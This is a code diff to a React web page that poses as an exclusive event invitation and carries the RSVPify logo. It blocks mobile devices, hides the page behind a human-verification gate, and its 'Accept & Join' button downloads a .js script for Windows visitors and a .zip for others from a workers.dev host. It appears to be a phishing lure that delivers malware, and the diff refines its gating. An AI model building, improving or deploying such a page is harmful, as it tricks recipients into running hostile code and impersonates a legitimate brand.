@@ -1,55 +1,28 @@
-import React, { useState, useEffect, useRef, useCallback } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import './App.css';
 
+// Replace with your Cloudflare Turnstile site key from dash.cloudflare.com
+const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PFOyWG2itBdMi';
+
 export default function App() {
+  const [gateVerified, setGateVerified] = useState(false);
   const [isMobile, setIsMobile] = useState(false);
 
   useEffect(() => {
-    const checkMobile = () => {
-      setIsMobile(window.innerWidth <= 768);
-    };
-
+    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
     checkMobile();
     window.addEventListener('resize', checkMobile);
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
 
-  if (isMobile)
-  {
-    return <MobileBlocker />;
-  }
-
-
+  if (isMobile) return <MobileBlocker />;
+  if (!gateVerified) return <TurnstileGate onVerified={() => setGateVerified(true)} />;
   return <Invite />;
 }
 
-// Replace with your Cloudflare Turnstile site key from dash.cloudflare.com
-const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PFOyWG2itBdMi';
-
-function Invite() {
-  const [verified, setVerified] = useState(false);
+function TurnstileGate({ onVerified }) {
   const turnstileRef = useRef(null);
   const widgetIdRef = useRef(null);
-
-  const handleDownload = () => {
-    if (!verified) return;
-    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
-    if (isWindows)
-    {
-      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Exclusive-Invite-to-Event.js';
-    } else
-    {
-      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Event-Invite.zip';
-    }
-  };
-
-  const onTurnstileSuccess = useCallback((token) => {
-    if (token) setVerified(true);
-  }, []);
-
-  const onTurnstileExpired = useCallback(() => {
-    setVerified(false);
-  }, []);
 
   useEffect(() => {
     const renderWidget = () => {
@@ -57,28 +30,60 @@ function Invite() {
       if (widgetIdRef.current !== null) return;
       widgetIdRef.current = window.turnstile.render(turnstileRef.current, {
         sitekey: TURNSTILE_SITE_KEY,
-        callback: onTurnstileSuccess,
-        'expired-callback': onTurnstileExpired,
+        callback: (token) => { if (token) onVerified(); },
+        'expired-callback': () => {
+          widgetIdRef.current = null;
+          renderWidget();
+        },
+        'error-callback': () => {
+          widgetIdRef.current = null;
+          setTimeout(renderWidget, 1000);
+        },
         theme: 'light',
+        appearance: 'always',
+        execution: 'render',
+        'refresh-expired': 'auto',
       });
     };
 
-    if (window.turnstile)
-    {
+    if (window.turnstile) {
       renderWidget();
-    } else
-    {
-      // Turnstile script may still be loading
+    } else {
       const interval = setInterval(() => {
-        if (window.turnstile)
-        {
+        if (window.turnstile) {
           clearInterval(interval);
           renderWidget();
         }
       }, 100);
       return () => clearInterval(interval);
     }
-  }, [onTurnstileSuccess, onTurnstileExpired]);
+  }, [onVerified]);
+
+  return (
+    <div className="gate-overlay">
+      <div className="gate-box">
+        <div className="gate-logo">
+          <img
+            src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
+            alt="RSVPify"
+          />
+        </div>
+        <p className="gate-label">Verifying you're human</p>
+        <div ref={turnstileRef} className="gate-widget"></div>
+      </div>
+    </div>
+  );
+}
+
+function Invite() {
+  const handleDownload = () => {
+    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;
+    if (isWindows) {
+      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Exclusive-Invite-to-Event.js';
+    } else {
+      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Event-Invite.zip';
+    }
+  };
 
   return (
     <>
@@ -105,13 +110,7 @@ function Invite() {
               <span className="highlight">Please accept this invitation and be part of something special.</span>
             </p>
 
-            <div ref={turnstileRef} className="turnstile-widget"></div>
-
-            <button
-              className={`accept-btn${!verified ? ' accept-btn--disabled' : ''}`}
-              onClick={handleDownload}
-              disabled={!verified}
-            >
+            <button className="accept-btn" onClick={handleDownload}>
               Accept & Join
             </button>
           </div>
